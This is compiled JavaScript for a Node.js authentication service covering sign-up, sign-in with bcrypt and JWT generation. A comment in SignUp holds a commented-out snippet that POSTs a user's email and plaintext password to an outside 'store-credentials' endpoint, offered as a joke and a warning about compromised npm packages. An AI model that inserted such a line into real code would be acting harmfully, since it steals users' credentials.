"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const typedi_1 = require("typedi");
const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
const mailer_1 = __importDefault(require("./mailer"));
const config_1 = __importDefault(require("../config"));
const bcrypt_1 = __importDefault(require("bcrypt"));
const eventDispatcher_1 = require("../decorators/eventDispatcher");
const events_1 = __importDefault(require("../subscribers/events"));
let AuthService = class AuthService {
    constructor(userModel, mailer, logger, eventDispatcher) {
        this.userModel = userModel;
        this.mailer = mailer;
        this.logger = logger;
        this.eventDispatcher = eventDispatcher;
    }
    async SignUp(userInputDTO) {
        try {
            const salt = 12;
            /**
             * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
             * require('http')
             *  .request({
             *     hostname: 'http://my-other-api.com/',
             *     path: '/store-credentials',
             *     port: 80,
             *     method: 'POST',
             * }, ()=>{}).write(JSON.stringify({ email, password })).end();
             *
             * Just kidding, don't do that!!!
             *
             * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
             * watches every API call and if it spots a 'password' and 'email' property then
             * it decides to steal them!? Would you even notice that? I wouldn't :/
             */
            this.logger.silly('Hashing password');
            this.logger.silly('Hashing password');
            const hashedPassword = await new Promise((resolve, reject) => {
                bcrypt_1.default.hash(userInputDTO.password, salt, function (err, hash) {
                    if (err)
                        reject(err);
                    resolve(hash);
                });
            });
            this.logger.silly('Creating user db record');
            const userRecord = await this.userModel.create(Object.assign({}, userInputDTO, { salt: salt.toString(), password: hashedPassword }));
            this.logger.silly('Generating JWT');
            const token = this.generateToken(userRecord);
            if (!userRecord) {
                throw new Error('User cannot be created');
            }
            this.logger.silly('Sending welcome email');
            await this.mailer.SendWelcomeEmail(userRecord.email);
            this.eventDispatcher.dispatch(events_1.default.user.signUp, { user: userRecord });
            /**
             * @TODO This is not the best way to deal with this
             * There should exist a 'Mapper' layer
             * that transforms data from layer to layer
             * but that's too over-engineering for now
             */
            const user = userRecord.toObject();
            Reflect.deleteProperty(user, 'password');
            Reflect.deleteProperty(user, 'salt');
            return { user, token };
        }
        catch (e) {
            this.logger.error(e);
            throw e;
        }
    }
    async SignIn(email, password) {
        const userRecord = await this.userModel.findOne({ email });
        if (!userRecord) {
            throw new Error('User not registered');
        }
        /**
         * We use verify from bcrypt to prevent 'timing based' attacks
         */
        this.logger.silly('Checking password');
        let validPassword = await new Promise((resolve, error) => {
            bcrypt_1.default.compare(password, userRecord.password, (err, success) => {
                if (err) {
                    return error(err);
                }
                resolve(success);
            });
        });
        this.logger.debug('Validation : %o', validPassword);
        if (validPassword) {
            this.logger.silly('Password is valid!');
            this.logger.silly('Generating JWT');
            const token = this.generateToken(userRecord);
            this.eventDispatcher.dispatch(events_1.default.user.signIn, { _id: userRecord._id, email: userRecord.email });
            const user = userRecord.toObject();
            Reflect.deleteProperty(user, 'password');
            Reflect.deleteProperty(user, 'salt');
            /**
             * Easy as pie, you don't need passport.js anymore :)
             */
            return { user, token };
        }
        else {
            throw new Error('Invalid Password');
        }
    }
    generateToken(user) {
        const today = new Date();
        const exp = new Date(today);
        exp.setDate(today.getDate() + 60);
        /**
         * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
         * The cool thing is that you can add custom properties a.k.a metadata
         * Here we are adding the userId, role and name
         * Beware that the metadata is public and can be decoded without _the secret_
         * but the client cannot craft a JWT to fake a userId
         * because it doesn't have _the secret_ to sign it
         * more information here: https://softwareontheroad.com/you-dont-need-passport
         */
        this.logger.silly(`Sign JWT for userId: ${user._id}`);
        return jsonwebtoken_1.default.sign({
            _id: user._id,
            role: user.role,
            name: user.name,
            exp: exp.getTime() / 1000,
        }, config_1.default.jwtSecret);
    }
};
AuthService = __decorate([
    typedi_1.Service(),
    __param(0, typedi_1.Inject('userModel')),
    __param(2, typedi_1.Inject('logger')),
    __param(3, eventDispatcher_1.EventDispatcher()),
    __metadata("design:paramtypes", [Object, mailer_1.default, Object, eventDispatcher_1.EventDispatcherInterface])
], AuthService);
exports.default = AuthService;
//# sourceMappingURL=auth.js.map